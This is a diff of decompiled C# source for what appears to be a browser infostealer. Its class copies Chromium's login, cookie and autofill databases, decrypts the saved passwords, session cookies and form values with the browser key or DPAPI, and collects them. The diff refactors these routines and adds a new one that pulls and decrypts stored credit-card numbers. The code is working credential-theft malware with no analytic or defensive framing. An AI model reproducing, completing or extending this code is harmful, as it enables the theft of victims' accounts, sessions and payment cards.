@@ -68,7 +68,6 @@ public static class Chr_0_M_e
 		return list;
 	}
 
-	// Token: 0x06000002 RID: 2 RVA: 0x000046BC File Offset: 0x000028BC
 	private static List<Account> ScanPasswords(string profilePath)
 	{
 		List<Account> list = new List<Account>();
@@ -79,49 +78,48 @@ public static class Chr_0_M_e
 			{
 				return list;
 			}
-			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
-			using (FileCopier fileCopier = new FileCopier())
+			string chromeKey = ReadKey(profilePath);
+			using FileCopier fileCopier = new FileCopier();
+			try
 			{
-				try
+				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
+				dbFactory.ReadContextTable("logins");
+				for (int i = 0; i < dbFactory.RowLength; i++)
 				{
-					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
-					dbFactory.ReadContextTable("logins");
-					for (int i = 0; i < dbFactory.RowLength; i++)
+					Account account = new Account();
+					try
 					{
-						Account account = new Account();
-						try
-						{
-							account.URL = dbFactory.ReadContextValue(i, 0).Trim();
-							account.Username = dbFactory.ReadContextValue(i, 3).Trim();
-							account.Password = Chr_0_M_e.DecryptChromium(dbFactory.ReadContextValue(i, 5), chromeKey);
-						}
-						catch (Exception)
-						{
-						}
-						finally
-						{
-							account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
-							account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
-							account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
-						}
-						if (account.Password != "UNKNOWN")
-						{
-							list.Add(account);
-						}
+						account.URL = dbFactory.ReadContextValue(i, 0).Trim();
+						account.Username = dbFactory.ReadContextValue(i, 3).Trim();
+						account.Password = DecryptChromium(dbFactory.ReadContextValue(i, 5), chromeKey);
+					}
+					catch (Exception)
+					{
+					}
+					finally
+					{
+						account.URL = (string.IsNullOrWhiteSpace(account.URL) ? "UNKNOWN" : account.URL);
+						account.Username = (string.IsNullOrWhiteSpace(account.Username) ? "UNKNOWN" : account.Username);
+						account.Password = (string.IsNullOrWhiteSpace(account.Password) ? "UNKNOWN" : account.Password);
+					}
+					if (account.Password != "UNKNOWN")
+					{
+						list.Add(account);
 					}
 				}
-				catch (Exception)
-				{
-				}
+				return list;
+			}
+			catch (Exception)
+			{
+				return list;
 			}
 		}
 		catch (Exception)
 		{
+			return list;
 		}
-		return list;
 	}
 
-	// Token: 0x06000003 RID: 3 RVA: 0x000048A8 File Offset: 0x00002AA8
 	private static List<ScannedCookie> ScanCook(string profilePath)
 	{
 		List<ScannedCookie> list = new List<ScannedCookie>();
@@ -132,105 +130,50 @@ public static class Chr_0_M_e
 			{
 				return list;
 			}
-			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
-			using (FileCopier fileCopier = new FileCopier())
+			string chromeKey = ReadKey(profilePath);
+			using FileCopier fileCopier = new FileCopier();
+			try
 			{
-				try
+				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
+				dbFactory.ReadContextTable("cookies");
+				for (int i = 0; i < dbFactory.RowLength; i++)
 				{
-					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
-					dbFactory.ReadContextTable("cookies");
-					for (int i = 0; i < dbFactory.RowLength; i++)
+					ScannedCookie scannedCookie = null;
+					try
 					{
-						ScannedCookie scannedCookie = null;
-						try
+						ScannedCookie scannedCookie2 = new ScannedCookie();
+						scannedCookie2.Host = dbFactory.GatherValue(i, "host_key").Trim();
+						scannedCookie2.Http = dbFactory.GatherValue(i, "host_key").Trim().StartsWith(".");
+						scannedCookie2.Path = dbFactory.GatherValue(i, "path").Trim();
+						scannedCookie2.Secure = dbFactory.GatherValue(i, "is_secure").Contains("1");
+						scannedCookie2.Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expires_utc").Trim()) / 1000000 - 11644473600L;
+						scannedCookie2.Name = dbFactory.GatherValue(i, "name").Trim();
+						scannedCookie2.Value = DecryptChromium(dbFactory.GatherValue(i, "encrypted_value"), chromeKey);
+						scannedCookie = scannedCookie2;
+						if (scannedCookie.Expires < 0)
 						{
-							scannedCookie = new ScannedCookie
-							{
-								Host = dbFactory.GatherValue(i, "host_key").Trim(),
-								Http = dbFactory.GatherValue(i, "host_key").Trim().StartsWith("."),
-								Path = dbFactory.GatherValue(i, "path").Trim(),
-								Secure = dbFactory.GatherValue(i, "is_secure").Contains("1"),
-								Expires = Convert.ToInt64(dbFactory.GatherValue(i, "expires_utc").Trim()) / 1000000L - 11644473600L,
-								Name = dbFactory.GatherValue(i, "name").Trim(),
-								Value = Chr_0_M_e.DecryptChromium(dbFactory.GatherValue(i, "encrypted_value"), chromeKey)
-							};
-							if (scannedCookie.Expires < 0L)
-							{
-								scannedCookie.Expires = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
-							}
-						}
-						catch
-						{
-						}
-						if (!string.IsNullOrWhiteSpace((scannedCookie != null) ? scannedCookie.Value : null))
-						{
-							list.Add(scannedCookie);
+							scannedCookie.Expires = DateTime.Now.AddMonths(12).Ticks - 621355968000000000L;
 						}
 					}
+					catch
+					{
+					}
+					if (!string.IsNullOrWhiteSpace(scannedCookie?.Value))
+					{
+						list.Add(scannedCookie);
+					}
 				}
-				catch
-				{
-				}
+				return list;
 			}
-		}
-		catch (Exception)
-		{
-		}
-		return list;
-	}
-
-	// Token: 0x06000004 RID: 4 RVA: 0x00004B0C File Offset: 0x00002D0C
-	private static List<Autofill> ScanFills(string profilePath)
-	{
-		List<Autofill> list = new List<Autofill>();
-		try
-		{
-			string text = Path.Combine(profilePath, "Web Data");
-			if (!File.Exists(text))
+			catch
 			{
 				return list;
 			}
-			string chromeKey = Chr_0_M_e.ReadKey(profilePath);
-			using (FileCopier fileCopier = new FileCopier())
-			{
-				try
-				{
-					DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
-					dbFactory.ReadContextTable("autofill");
-					for (int i = 0; i < dbFactory.RowLength; i++)
-					{
-						Autofill autofill = null;
-						try
-						{
-							string text2 = dbFactory.GatherValue(i, "value").Trim();
-							if (text2.StartsWith("v10") || text2.StartsWith("v11"))
-							{
-								text2 = Chr_0_M_e.DecryptChromium(text2, chromeKey);
-							}
-							autofill = new Autofill
-							{
-								Name = dbFactory.GatherValue(i, "name").Trim(),
-								Value = text2
-							};
-						}
-						catch
-						{
-						}
-						if (autofill != null)
-						{
-							list.Add(autofill);
-						}
-					}
-				}
-				catch (Exception)
-				{
-				}
-			}
 		}
 		catch (Exception)
 		{
+			return list;
 		}
-		return list;
 	}
 
 	private static List<Autofill> ScanFills(string profilePath)
@@ -285,7 +228,56 @@ public static class Chr_0_M_e
 		}
 	}
 
-	// Token: 0x06000006 RID: 6 RVA: 0x00004E58 File Offset: 0x00003058
+	private static List<CC> ScanCC(string profilePath)
+	{
+		List<CC> list = new List<CC>();
+		try
+		{
+			string text = Path.Combine(profilePath, "Web Data");
+			if (!File.Exists(text))
+			{
+				return list;
+			}
+			string chromeKey = ReadKey(profilePath);
+			using FileCopier fileCopier = new FileCopier();
+			try
+			{
+				DbFactory dbFactory = new DbFactory(fileCopier.CreateShadowCopy(text));
+				dbFactory.ReadContextTable("credit_cards");
+				for (int i = 0; i < dbFactory.RowLength; i++)
+				{
+					CC cC = null;
+					try
+					{
+						string number = DecryptChromium(dbFactory.GatherValue(i, "card_number_encrypted"), chromeKey).Replace(" ", string.Empty);
+						CC cC2 = new CC();
+						cC2.HolderName = dbFactory.GatherValue(i, "name_on_card").Trim();
+						cC2.Month = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_month").Trim());
+						cC2.Year = Convert.ToInt32(dbFactory.GatherValue(i, "expiration_year").Trim());
+						cC2.Number = number;
+						cC = cC2;
+					}
+					catch
+					{
+					}
+					if (cC != null)
+					{
+						list.Add(cC);
+					}
+				}
+				return list;
+			}
+			catch
+			{
+				return list;
+			}
+		}
+		catch (Exception)
+		{
+			return list;
+		}
+	}
+
 	private static string DecryptChromium(string chiperText, string chromeKey)
 	{
 		string result = string.Empty;
@@ -294,36 +286,33 @@ public static class Chr_0_M_e
 			if (chiperText[0] == 'v' && chiperText[1] == '1')
 			{
 				result = CryptoProvider.Decrypt(Convert.FromBase64String(chromeKey), chiperText);
+				return result;
 			}
-			else
-			{
-				result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser, null).Trim();
-			}
+			result = CryptoHelper.DecryptBlob(chiperText, DataProtectionScope.CurrentUser).Trim();
+			return result;
 		}
 		catch (Exception)
 		{
+			return result;
 		}
-		return result;
 	}
 
-	// Token: 0x06000007 RID: 7 RVA: 0x00004EB4 File Offset: 0x000030B4
 	public static T MakeTries<T>(Func<T> func, Func<T, bool> success)
 	{
 		int num = 1;
-		T t = func();
-		while (!success(t))
+		T val = func();
+		while (!success(val))
 		{
-			t = func();
+			val = func();
 			num++;
 			if (num > 2)
 			{
-				return t;
+				return val;
 			}
 		}
-		return t;
+		return val;
 	}
 
-	// Token: 0x06000008 RID: 8 RVA: 0x00004EE8 File Offset: 0x000030E8
 	private static string ReadKey(string profilePath)
 	{
 		string result = string.Empty;
